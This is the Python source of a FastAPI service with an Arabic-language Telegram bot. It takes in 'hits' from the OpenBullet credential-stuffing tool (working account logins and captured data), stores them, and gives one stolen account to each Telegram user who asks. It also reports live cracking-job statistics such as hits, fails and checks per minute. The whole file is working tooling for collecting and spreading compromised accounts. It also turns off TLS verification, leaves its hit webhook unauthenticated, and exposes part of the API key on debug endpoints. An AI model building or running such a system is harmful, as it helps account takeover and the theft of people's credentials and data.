from fastapi import FastAPI, Request
import httpx
import os
import logging
import hashlib
from sqlalchemy import create_engine, Column, Integer, String, Boolean, func
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("OB_Bridge")

app = FastAPI()

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_IDS = os.getenv("ADMIN_IDS", "6624995237").split(",")

OPENBULLET_URL = os.getenv("OPENBULLET_URL")
OPENBULLET_API_KEY = os.getenv("OPENBULLET_API_KEY")

DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# ==================== DATABASE ====================
engine = create_engine(DATABASE_URL, pool_pre_ping=True, pool_recycle=300)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class Account(Base):
    __tablename__ = "accounts"
    id = Column(Integer, primary_key=True, index=True)
    config_name = Column(String, index=True)
    account_data = Column(String, unique=True, index=True)
    captured_data = Column(String)
    is_given = Column(Boolean, default=False)


class DeliveredAccount(Base):
    __tablename__ = "delivered_accounts"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String, unique=True, index=True)


Base.metadata.create_all(bind=engine)

# ==================== HELPERS ====================


def config_hash(name: str) -> str:
    return hashlib.md5(name.encode("utf-8")).hexdigest()[:12]


def safe_md(text: str) -> str:
    if not text:
        return ""
    return str(text).replace("`", "'").replace("\\", "/")


def resolve_progress(val) -> str:
    try:
        p = float(val) if val is not None else 0.0
    except (TypeError, ValueError):
        return "0.0"
    if p <= 1.0:
        return f"{p * 100:.1f}"
    return f"{p:.1f}"


# ==================== KEYBOARDS ====================


def get_main_keyboard(is_admin: bool):
    buttons = [
        [
            {"text": "⚡ 🧬 سحب حساب جديد 🧬 ⚡"},
            {"text": "📡 🌐 إحصائيات المخزن 🌐 📡"},
        ],
        [{"text": "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖"}],
    ]
    if is_admin:
        buttons.append([{"text": "🛠️ 👾 لوحة تحكم المطور 👾 🛠️"}])
    return {
        "keyboard": buttons,
        "resize_keyboard": True,
        "one_time_keyboard": False,
    }


def get_inline_control_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "🧹 تصفير الموزع", "callback_data": "reset_delivered"},
                {"text": "🚨 تصفير المخزن بالكامل", "callback_data": "clear_accounts"},
            ],
            [
                {"text": "🔄 تحديث بيانات اللوحة", "callback_data": "refresh_admin_stats"}
            ],
        ]
    }


# ==================== TELEGRAM SENDER WRAPPERS ====================


async def tg_send(chat_id: str, text: str, **kwargs):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    payload.update(kwargs)
    async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
        try:
            await c.post(url, json=payload)
        except Exception as e:
            logger.error(f"tg_send failed: {e}")


async def tg_edit(chat_id: str, message_id: int, text: str, **kwargs):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "Markdown",
    }
    payload.update(kwargs)
    async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
        try:
            await c.post(url, json=payload)
        except Exception as e:
            logger.error(f"tg_edit failed: {e}")


async def tg_answer(callback_id: str, text: str, show_alert: bool = False):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
    async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
        try:
            await c.post(
                url,
                json={
                    "callback_query_id": callback_id,
                    "text": text,
                    "show_alert": show_alert,
                },
            )
        except Exception as e:
            logger.error(f"tg_answer failed: {e}")


# ==================== OPENBULLET API ====================


async def get_auth_headers() -> tuple:
    """
    يجرب 3 صيغ مصادقة ويرجع (headers_dict, label_string).
    يُرجع (None, None) إذا فشلت كلها.
    مُغلف بـ try/except لمنع الانهيار.
    """
    if not OPENBULLET_URL or not OPENBULLET_API_KEY:
        return None, None

    base = OPENBULLET_URL.strip().rstrip("/")
    raw_key = OPENBULLET_API_KEY.strip()
    test_url = f"{base}/api/v1/job/all"

    methods = [
        ({"Authorization": raw_key, "Accept": "application/json"}, "مباشر"),
        ({"Authorization": f"Bearer {raw_key}", "Accept": "application/json"}, "Bearer"),
        ({"X-API-Key": raw_key, "Accept": "application/json"}, "X-API-Key"),
    ]

    try:
        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
            for hdrs, label in methods:
                try:
                    resp = await client.get(test_url, headers=hdrs)
                    if resp.status_code == 200 and "json" in resp.headers.get("content-type", ""):
                        logger.info(f"Auth '{label}' succeeded")
                        return hdrs, label
                    else:
                        logger.warning(f"Auth '{label}' -> HTTP {resp.status_code}")
                except Exception as e:
                    logger.error(f"Auth '{label}' connection error: {e}")
    except Exception as e:
        logger.error(f"get_auth_headers fatal error: {e}")

    return None, None


def _unwrap(obj) -> dict:
    """يفك غلاف 'value' إن وُجد."""
    if not isinstance(obj, dict):
        return obj
    if "value" in obj and isinstance(obj["value"], dict):
        merged = {k: v for k, v in obj.items() if k != "value"}
        merged.update(obj["value"])
        return merged
    return obj


def _g(obj, *keys):
    """يبحث عن أول مفتاح موجود في القاموس."""
    if not isinstance(obj, dict):
        return None
    for k in keys:
        if k in obj and obj[k] is not None:
            return obj[k]
    return None


def _num(val, fallback=0) -> int:
    try:
        return int(float(val)) if val is not None else fallback
    except (TypeError, ValueError):
        return fallback


def _is_active(status_val) -> bool:
    if status_val is None:
        return False
    return str(status_val).strip().lower() in ("running", "active", "started", "executing")


def _extract_detail(raw: dict) -> dict:
    """
    يستخرج البيانات من رد /api/v1/job/{id}
    بمرونة تامة لأي اسم حقول.
    """
    uw = _unwrap(raw) if isinstance(raw, dict) else {}
    return {
        "progress": _g(uw, "progress", "completionRatio", "completionRate", "percent", "completion"),
        "cpm":      _g(uw, "cpm", "speed", "checkSpeed", "checksPerMinute"),
        "hits":     _g(uw, "hits", "hitsCount", "good", "goodCount", "success"),
        "custom":   _g(uw, "custom", "customCount", "captured"),
        "total":    _g(uw, "total", "totalChecks", "checked", "dataTested"),
        "bad":      _g(uw, "bad", "badCount", "fail", "failed", "toCheck"),
        "name":     _g(uw, "name", "jobName", "configName"),
        "status":   _g(uw, "status", "state"),
        "_keys":    list(uw.keys()) if isinstance(uw, dict) else [],
    }


async def fetch_ob_status() -> dict:
    """
    الاستراتيجية:
      1. مصادقة تلقائية
      2. /job/all → قائمة العمليات
      3. فلتر النشطة
      4. /job/{id} → تفاصيل كل عملية نشطة
    """
    headers, auth_label = await get_auth_headers()

    if not headers:
        return {
            "error": (
                "فشلت المصادقة.\n\n"
                f"🔗 `{OPENBULLET_URL}`\n"
                f"🔑 `{(OPENBULLET_API_KEY or '')[:8]}...`\n\n"
                "OB → Settings → General → Admin API Key → احفظ"
            ),
            "jobs": [],
            "monitors": [],
            "total_all": 0,
            "auth_method": None,
        }

    base = OPENBULLET_URL.strip().rstrip("/")
    result = {
        "auth_method": auth_label,
        "jobs": [],
        "monitors": [],
        "total_all": 0,
    }

    try:
        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:

            # ---- قائمة العمليات ----
            resp = await client.get(f"{base}/api/v1/job/all", headers=headers)
            if resp.status_code != 200:
                return {**result, "error": f"قائمة العمليات: HTTP {resp.status_code}"}

            list_data = resp.json()
            all_jobs = (
                list_data.get("items", [])
                if isinstance(list_data, dict)
                else (list_data if isinstance(list_data, list) else [])
            )
            result["total_all"] = len(all_jobs)

            # ---- فلتر النشطة ----
            active_items = [
                {"id": j["id"], "name": j.get("name", "بدون اسم"), "status": j.get("status")}
                for j in all_jobs
                if isinstance(j, dict) and j.get("id") is not None and _is_active(j.get("status"))
            ]

            # ---- جلب تفاصيل كل عملية نشطة ----
            for item in active_items:
                detail = {
                    "id": item["id"],
                    "name": item["name"],
                    "status": item["status"],
                    "progress": None, "cpm": None, "hits": None,
                    "custom": None, "total": None, "bad": None,
                }
                try:
                    resp2 = await client.get(f"{base}/api/v1/job/{item['id']}", headers=headers)
                    if resp2.status_code == 200:
                        raw = resp2.json()
                        ext = _extract_detail(raw)
                        detail["progress"] = ext["progress"]
                        detail["cpm"] = ext["cpm"]
                        detail["hits"] = ext["hits"]
                        detail["custom"] = ext["custom"]
                        detail["total"] = ext["total"]
                        detail["bad"] = ext["bad"]
                        if ext["name"]:
                            detail["name"] = ext["name"]
                        logger.info(f"Job {item['id']} keys: {ext['_keys']}")
                    else:
                        logger.warning(f"Job {item['id']} detail HTTP {resp2.status_code}")
                except Exception as e:
                    logger.error(f"Job {item['id']} detail error: {e}")

                result["jobs"].append(detail)

            # ---- مراقبات ----
            try:
                resp3 = await client.get(f"{base}/api/v1/jobmonitor/all", headers=headers)
                if resp3.status_code == 200:
                    mon_data = resp3.json()
                    monitors = (
                        mon_data.get("items", [])
                        if isinstance(mon_data, dict)
                        else (mon_data if isinstance(mon_data, list) else [])
                    )
                    for m in monitors:
                        if isinstance(m, dict) and _is_active(m.get("status")):
                            ext = _extract_detail(m)
                            result["monitors"].append({
                                "name": ext["name"] or "مراقب",
                                "status": ext["status"],
                                "progress": ext["progress"],
                                "cpm": ext["cpm"],
                                "hits": ext["hits"],
                                "custom": ext["custom"],
                                "total": ext["total"],
                                "bad": ext["bad"],
                            })
            except Exception as e:
                logger.error(f"Monitors error: {e}")

    except Exception as e:
        logger.error(f"fetch_ob_status error: {e}", exc_info=True)
        return {**result, "error": f"خطأ عام: {e}"}

    return result


def format_ob_message(ob_data: dict) -> str:
    """يحوّل البيانات لرسالة تلغرام."""

    if "error" in ob_data and not ob_data.get("jobs"):
        return f"❌ **خطأ:**\n{ob_data['error']}"

    auth_line = f"🔑 **المصادقة:** `{ob_data['auth_method']}`\n" if ob_data.get("auth_method") else ""

    jobs = ob_data.get("jobs", [])
    monitors = ob_data.get("monitors", [])
    total_all = ob_data.get("total_all", 0)
    total_active = len(jobs) + len(monitors)

    if total_active == 0:
        return (
            "💤 **حالة الـ Mainframe:** `خامل (IDLE)`\n\n"
            f"{auth_line}"
            f"📊 **إجمالي العمليات:** `{total_all}`\n"
            f"🟢 **النشطة:** `0`\n\n"
            "_لا توجد عمليات نشطة حالياً._"
        )

    lines = [
        "⚙️ **「 شاشة مراقبة OPENBULLET 」** ⚙️\n",
        auth_line,
        f"⚡ **النشطة:** `{total_active}` من `{total_all}`",
        "━━━━━━━━━━━━━━━━━━━━",
    ]

    # تمييز الأسماء المتكررة
    name_count = {}
    for j in jobs:
        name_count[j["name"]] = name_count.get(j["name"], 0) + 1
    name_seen = {}

    for job in jobs:
        name = safe_md(job["name"])
        if name_count.get(job["name"], 0) > 1:
            name_seen[job["name"]] = name_seen.get(job["name"], 0) + 1
            name = f"{name} #{name_seen[job['name']]}"

        hits = _num(job["hits"])
        custom = _num(job["custom"])
        total = _num(job["total"])
        bad = _num(job["bad"])
        cpm = _num(job["cpm"])
        progress = resolve_progress(job["progress"])

        lines.append(f"📦 **عملية:** `{name}`")
        lines.append(f"   🆔 `{job['id']}`")
        lines.append(f"   📊 التقدم: `{progress}%`")

        if total > 0:
            lines.append(f"   📋 تم فحص: `{total}`")
            lines.append(f"   🎯 Hits: `{hits}`")
            if custom > 0:
                lines.append(f"   ⭐ Custom: `{custom}`")
            lines.append(f"   ❌ Fail: `{bad}`")
        else:
            lines.append(f"   🎯 Hits: `{hits}`")
            if custom > 0:
                lines.append(f"   ⭐ Custom: `{custom}`")

        lines.append(f"   ⚡ السرعة: `{cpm}` CPM")
        lines.append("━━━━━━━━━━━━━━━━━━━━")

    for mon in monitors:
        name = safe_md(mon.get("name", "مراقب"))
        hits = _num(mon.get("hits"))
        custom = _num(mon.get("custom"))
        total = _num(mon.get("total"))
        cpm = _num(mon.get("cpm"))
        progress = resolve_progress(mon.get("progress"))

        lines.append(f"🔄 **مراقب:** `{name}`")
        lines.append(f"   📊 التقدم: `{progress}%`")
        if total > 0:
            lines.append(f"   📋 تم فحص: `{total}`")
        lines.append(f"   🎯 Hits: `{hits}`")
        if custom > 0:
            lines.append(f"   ⭐ Custom: `{custom}`")
        lines.append(f"   ⚡ السرعة: `{cpm}` CPM")
        lines.append("━━━━━━━━━━━━━━━━━━━━")

    return "\n".join(lines)


# ==================== WEBHOOK: HIT ====================


@app.post("/webhook/hit")
async def receive_hit(request: Request):
    db = SessionLocal()
    try:
        data = await request.json()

        config_name = "UNKNOWN"
        for key in ("config", "configName", "ConfigName"):
            if data.get(key):
                config_name = data.get(key)
                break
        if config_name == "UNKNOWN" and data.get("variables"):
            for var in data.get("variables", []):
                if isinstance(var, dict) and var.get("name") in ("Config.Name", "config", "Config"):
                    config_name = var.get("value", "UNKNOWN")
                    break

        config_name = os.path.basename(str(config_name)).replace(".anom", "").replace(".opk", "").strip()
        account_data = str(data.get("data") or data.get("account") or "NO_DATA").strip()
        captured_data = str(
            data.get("captured") or data.get("capturedData") or data.get("variables") or "NO_CAPTURED_DATA"
        ).strip()[:5000]

        if db.query(Account).filter(Account.account_data == account_data).first():
            return {"status": "ignored"}

        db.add(Account(
            config_name=config_name or "UNKNOWN",
            account_data=account_data,
            captured_data=captured_data,
            is_given=False,
        ))
        db.commit()
        return {"status": "success"}
    except Exception as e:
        db.rollback()
        logger.error(f"/webhook/hit error: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}
    finally:
        db.close()


# ==================== WEBHOOK: TELEGRAM ====================


@app.post("/webhook/telegram")
async def telegram_webhook(request: Request):
    db = SessionLocal()
    try:
        payload = await request.json()

        # ========== CALLBACK ==========
        if "callback_query" in payload:
            cb = payload["callback_query"]
            callback_id = cb["id"]
            chat_id = str(cb["message"]["chat"]["id"])
            message_id = cb["message"]["message_id"]
            data = cb["data"]

            if data.startswith("claim_cfg:"):
                cfg_h = data.split("claim_cfg:", 1)[1]
                all_cfgs = db.query(Account.config_name).filter(Account.is_given == False).distinct().all()
                selected = None
                for (name,) in all_cfgs:
                    if config_hash(name) == cfg_h:
                        selected = name
                        break

                if not selected:
                    await tg_answer(callback_id, "❌ لم يتم العثور على هذا النوع!", show_alert=True)
                    return {"status": "ok"}

                if db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first():
                    await tg_answer(callback_id, "❌ لقد سحبت حصتك سابقاً!", show_alert=True)
                    return {"status": "ok"}

                account = (
                    db.query(Account)
                    .filter(Account.config_name == selected, Account.is_given == False)
                    .with_for_update().first()
                )

                if not account:
                    await tg_answer(callback_id, "😔 نفدت الحسابات من هذا النوع!", show_alert=True)
                    return {"status": "ok"}

                account.is_given = True
                db.add(DeliveredAccount(user_id=chat_id))
                db.commit()

                await tg_edit(chat_id, message_id,
                    f"🌌 **⚡ 「 تم السحب بنجاح 」 ⚡** 🌌\n\n"
                    f"📦 **النوع:** `{safe_md(account.config_name)}`\n\n"
                    f"👤 **الحساب:**\n`{safe_md(account.account_data)}`\n\n"
                    f"⚙️ **المستخرج:**\n`{safe_md(account.captured_data)}`\n\n"
                    f"🔒 _STATUS: TERMINAL LOCKED_"
                )
                return {"status": "ok"}

            if chat_id not in ADMIN_IDS:
                return {"status": "ok"}

            if data == "reset_delivered":
                count = db.query(DeliveredAccount).count()
                db.query(DeliveredAccount).delete()
                db.commit()
                await tg_answer(callback_id, f"🧹 تم تصفير الموزع ({count} سجل)", show_alert=True)

            elif data == "clear_accounts":
                ac = db.query(Account).count()
                dc = db.query(DeliveredAccount).count()
                db.query(DeliveredAccount).delete()
                db.query(Account).delete()
                db.commit()
                await tg_answer(callback_id, f"🚨 مسح {ac} حساب و {dc} سجل.", show_alert=True)

            elif data == "refresh_admin_stats":
                total = db.query(Account).count()
                avail = db.query(Account).filter(Account.is_given == False).count()
                given = db.query(Account).filter(Account.is_given == True).count()
                await tg_edit(chat_id, message_id,
                    f"┌─── 🌌 **「 لوحة تحكم النيون 」** 🌌\n"
                    f"│\n"
                    f"├── 🟣 **الإجمالي:** `{total}`\n"
                    f"├── 🟢 **الجاهزة:** `{avail}`\n"
                    f"└── 🔴 **الموزعة:** `{given}`\n"
                    f"│\n"
                    f"└────────────── [ تحديث مباشر ] 🖥️",
                    reply_markup=get_inline_control_buttons()
                )

            return {"status": "ok"}

        # ========== TEXT ==========
        if "message" not in payload or "text" not in payload["message"]:
            return {"status": "ignored"}

        chat_id = str(payload["message"]["chat"]["id"])
        text = payload["message"]["text"].strip()
        is_admin = chat_id in ADMIN_IDS

        if text == "/start":
            await tg_send(chat_id,
                "🌌 **WELCOME TO THE CYBERPUNK DISTRIBUTOR CORE** 🌌\n\n"
                "⚡ `الحالة: متصل بالشبكة الآمنة`\n"
                "🎛️ `الواجهة: ثيم التوزيع التفاعلي v4.8`\n\n"
                "🤖 _اضغط على سحب حساب بالأسفل..._",
                reply_markup=get_main_keyboard(is_admin),
            )

        elif text in ("📡 🌐 إحصائيات المخزن 🌐 📡", "/stats"):
            avail = db.query(Account).filter(Account.is_given == False).count()
            await tg_send(chat_id,
                "┌─── 📡 **「 مستودع البيانات 」** 📡\n"
                "│\n"
                f"└── 🟢 **المتوفر:** `{avail}` حساب\n"
                "│\n"
                "└───────────── [ مصفوفة حية ] ⚡",
            )

        elif text in ("⚡ 🧬 سحب حساب جديد 🧬 ⚡", "/get"):
            if db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first():
                await tg_send(chat_id,
                    "🚨 **SYSTEM DENIAL:** `جدار الحماية نشط` 🚨\n\n"
                    "❌ يسمح النظام بـ **حساب واحد فقط لكل مستخدم**.",
                )
                return {"status": "ok"}

            results = (
                db.query(Account.config_name, func.count(Account.id))
                .filter(Account.is_given == False)
                .group_by(Account.config_name).all()
            )
            results = [(c, n) for c, n in results if c]

            if not results:
                await tg_send(chat_id,
                    "🚨 **MAINFRAME ERROR:** `المستودع فارغ حالياً` 🚨\n\n"
                    "😔 لا توجد حسابات جاهزة.",
                )
            else:
                buttons = []
                for cfg_name, count in results:
                    display = cfg_name if len(cfg_name) <= 40 else cfg_name[:37] + "..."
                    buttons.append([{
                        "text": f"🎁 {display} ({count})",
                        "callback_data": f"claim_cfg:{config_hash(cfg_name)}"
                    }])
                await tg_send(chat_id,
                    "┌─── 🎛️ **「 قائمة التخصيص 」** 🎛️\n"
                    "│\n"
                    "├── ⚡ تم فحص قاعدة البيانات.\n"
                    "└── 👇 **اختر نوع الحساب:**",
                    reply_markup={"inline_keyboard": buttons},
                )

        elif text == "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖":
            ob_data = await fetch_ob_status()
            await tg_send(chat_id, format_ob_message(ob_data))

        elif text == "🛠️ 👾 لوحة تحكم المطور 👾 🛠️" and is_admin:
            total = db.query(Account).count()
            avail = db.query(Account).filter(Account.is_given == False).count()
            given = db.query(Account).filter(Account.is_given == True).count()
            await tg_send(chat_id,
                "┌─── 🌌 **「 لوحة تحكم النيون 」** 🌌\n"
                "│\n"
                f"├── 🟣 **الإجمالي:** `{total}`\n"
                f"├── 🟢 **الجاهزة:** `{avail}`\n"
                f"└── 🔴 **الموزعة:** `{given}`\n"
                "│\n"
                "└────────────── [ أوامر النظام ] 👇",
                reply_markup=get_inline_control_buttons(),
            )

        return {"status": "ok"}

    except Exception as e:
        db.rollback()
        logger.error(f"Telegram webhook error: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}
    finally:
        db.close()


# ==================== DEBUG ENDPOINTS ====================


@app.get("/health")
def health_check():
    return {"status": "healthy"}


@app.get("/debug/ob")
async def debug_ob():
    """
    تشخيص شامل يعرض:
      - القائمة الخفيفة من /job/all
      - تفاصيل أول عملية نشطة من /job/{id}
    """
    try:
        headers, auth_label = await get_auth_headers()

        if not headers:
            return {
                "error": "فشلت المصادقة",
                "url": OPENBULLET_URL,
                "key_preview": (OPENBULLET_API_KEY or "")[:10] + "..." if OPENBULLET_API_KEY else "MISSING",
            }

        base = OPENBULLET_URL.strip().rstrip("/")
        result = {
            "auth": auth_label,
            "jobs_list": [],
            "first_active_detail": None,
            "first_active_detail_unwrapped": None,
        }

        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
            # القائمة
            try:
                resp = await client.get(f"{base}/api/v1/job/all", headers=headers)
                if resp.status_code == 200:
                    data = resp.json()
                    items = data.get("items", data) if isinstance(data, dict) else data
                    result["jobs_list"] = items if isinstance(items, list) else []

                    # تفاصيل أول عملية نشطة
                    for j in result["jobs_list"]:
                        if isinstance(j, dict) and _is_active(j.get("status")) and j.get("id") is not None:
                            resp2 = await client.get(f"{base}/api/v1/job/{j['id']}", headers=headers)
                            if resp2.status_code == 200:
                                raw = resp2.json()
                                result["first_active_detail"] = raw
                                result["first_active_detail_unwrapped"] = _unwrap(raw)
                            else:
                                result["first_active_detail"] = {
                                    "http_error": resp2.status_code,
                                    "body": resp2.text[:500]
                                }
                            break
                else:
                    result["list_error"] = f"HTTP {resp.status_code}: {resp.text[:300]}"
            except Exception as e:
                result["list_error"] = str(e)

        return result

    except Exception as e:
        logger.error(f"/debug/ob error: {e}", exc_info=True)
        return {"fatal_error": str(e)}


@app.get("/debug/job/{job_id}")
async def debug_job(job_id: int):
    """
    يعرض تفاصيل عملية واحدة بالكامل كما جاءت من API.
    آمن تماماً ضد أي خطأ.
    """
    try:
        if not OPENBULLET_URL or not OPENBULLET_API_KEY:
            return {"error": "متغيرات البيئة غير مكتملة", "url": OPENBULLET_URL, "has_key": bool(OPENBULLET_API_KEY)}

        base = OPENBULLET_URL.strip().rstrip("/")
        headers, auth_label = await get_auth_headers()

        if not headers:
            return {"error": "فشلت المصادقة", "auth_tried": auth_label}

        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
            resp = await client.get(f"{base}/api/v1/job/{job_id}", headers=headers)

            result = {
                "job_id": job_id,
                "auth_used": auth_label,
                "http_status": resp.status_code,
                "content_type": resp.headers.get("content-type", "?"),
            }

            if resp.status_code == 200:
                try:
                    raw = resp.json()
                    result["raw_json"] = raw
                    result["unwrapped"] = _unwrap(raw)
                    result["extracted"] = _extract_detail(raw)
                except Exception as e:
                    result["parse_error"] = str(e)
                    result["raw_text"] = resp.text[:2000]
            else:
                result["error_body"] = resp.text[:1000]

            return result

    except httpx.ConnectError:
        return {"error": "فشل الاتصال بالخادم", "url": OPENBULLET_URL}
    except httpx.TimeoutException:
        return {"error": "انتهت مهلة الاتصال (15 ثانية)"}
    except Exception as e:
        logger.error(f"/debug/job/{job_id} error: {e}", exc_info=True)
        return {"error": f"خطأ غير متوقع: {e}"}


@app.post("/setup/webhook")
async def setup_webhook():
    render_url = os.getenv("RENDER_EXTERNAL_URL", "")
    if not render_url:
        return {"error": "RENDER_EXTERNAL_URL not set"}
    webhook_url = f"{render_url.rstrip('/')}/webhook/telegram"
    async with httpx.AsyncClient() as c:
        resp = await c.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook",
            json={"url": webhook_url},
        )
    return resp.json()
